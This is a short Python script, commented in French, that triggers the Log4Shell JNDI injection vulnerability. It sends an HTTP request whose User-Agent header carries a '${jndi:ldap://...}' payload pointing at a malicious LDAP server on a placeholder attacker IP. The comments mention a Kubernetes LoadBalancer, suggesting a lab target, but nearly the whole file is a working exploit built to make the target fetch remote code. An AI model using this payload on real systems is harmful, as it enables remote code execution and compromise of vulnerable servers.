import requests

# Remplacer par l'IP publique du service LoadBalancer ou via kubectl get svc
TARGET_URL = "http://<IP_PUBLIC>/"
LDAP_URL = "ldap://<ATTACKER_IP>:1389/a"  # Serveur LDAP malveillant à lancer en parallèle

headers = {
    "User-Agent": f"${{jndi:{LDAP_URL}}}"
}

try:
    response = requests.get(TARGET_URL, headers=headers, timeout=5)
    print("Payload envoyé. Vérifie si ton serveur LDAP reçoit une connexion.")
except Exception as e:
    print(f"Erreur : {e}")